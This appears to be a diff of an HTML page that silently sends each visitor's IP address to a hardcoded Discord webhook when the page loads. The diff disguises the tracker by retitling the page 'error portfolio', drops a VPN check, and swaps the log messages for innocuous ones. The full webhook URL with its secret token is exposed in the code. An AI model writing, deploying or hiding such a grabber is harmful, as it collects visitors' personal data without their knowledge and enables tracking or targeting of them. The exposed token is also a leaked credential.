@@ -3,16 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send IP Address to Discord</title>
+    <title>error portfolio</title>
 </head>
 <body>
 
     <script>
-        function sendIPToDiscord(ipAddress, isVPN) {
+        function sendIPToDiscord(ipAddress) {
             // Construct the message
-            const message = `**New User Information:**\n\n` +
-                            `- **IP Address:** ${ipAddress}\n` +
-                            `- **VPN Detected:** ${isVPN ? 'Yes' : 'No'}`;
+            const message = `User's IP Address: ${ipAddress}`;
 
             // Discord webhook URL
             const webhookURL = 'https://discord.com/api/webhooks/1233307543871426672/Jw5uHUpnGuI0I_yzbO9MglueN9FRZPOzezkbQr684U2L6rK3Ej2Y-LBSzYGVQ9qTwYax';
@@ -32,34 +30,23 @@
             })
             .then(response => {
                 if (response.ok) {
-                    console.log('IP Address sent to Discord webhook successfully.');
+                    console.log('welcome');
                 } else {
-                    throw new Error('Failed to send IP Address to Discord webhook.');
+                    throw new Error('unkown erorr');
                 }
             })
             .catch(error => {
-                console.error('Error sending IP Address to Discord webhook:', error);
+                console.error('error', error);
             });
         }
 
-        // Function to fetch the IP address and check for VPN
+        // Function to fetch the IP address and send it to Discord
         function getIPAddress() {
             // Make AJAX request to get the client's IP address
             fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                const ipAddress = data.ip;
-                // Check for VPN using vpnapi.io
-                fetch('https://vpnapi.io/api/ip/' + ipAddress + '?key=YOUR_VPNAPI_IO_API_KEY')
-                .then(response => response.json())
-                .then(vpnData => {
-                    const isVPN = vpnData.security.vpn;
-                    sendIPToDiscord(ipAddress, isVPN);
-                })
-                .catch(error => {
-                    console.error('Error checking VPN:', error);
-                    sendIPToDiscord(ipAddress, false); // Assume not VPN if check fails
-                });
+                sendIPToDiscord(data.ip);
             })
             .catch(error => {
                 console.error('Error getting IP address:', error);
@@ -69,5 +56,3 @@
         // Call getIPAddress function when the page loads
         getIPAddress();
     </script>
-</body>
-</html>
